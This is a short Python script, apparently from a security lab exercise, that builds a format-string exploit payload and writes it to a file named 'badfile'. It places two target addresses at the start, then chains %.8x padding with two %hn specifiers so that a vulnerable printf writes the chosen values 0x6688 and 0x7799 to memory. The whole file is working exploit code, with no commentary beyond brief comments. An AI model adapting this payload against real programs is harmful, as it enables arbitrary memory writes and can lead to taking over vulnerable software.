#!/usr/bin/python3

import sys

content = bytearray(0x0 for i in range(100))

# Put the address at the beginning
#addr1 = 0xbfffebd4
#addr2 = 0xbfffebd6
addr1 = 0xffffd194
addr2 = 0xffffd196
content[0:4] = (addr2).to_bytes(4,byteorder='little')
content[4:8] = ("@@@@").encode('latin-1')
content[8:12] = (addr1).to_bytes(4,byteorder='little')

###################################################
# Add the format specifiers
C = 4
D1 = 0x6688 - 12 - 8*C
D2 = 0x7799 -0x6688
s = "%.8x"*C + "%." + str(D1) + "x" + "%hn" \
             + "%." + str(D2) + "x" + "%hn" \
             + "\n"

fmt = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
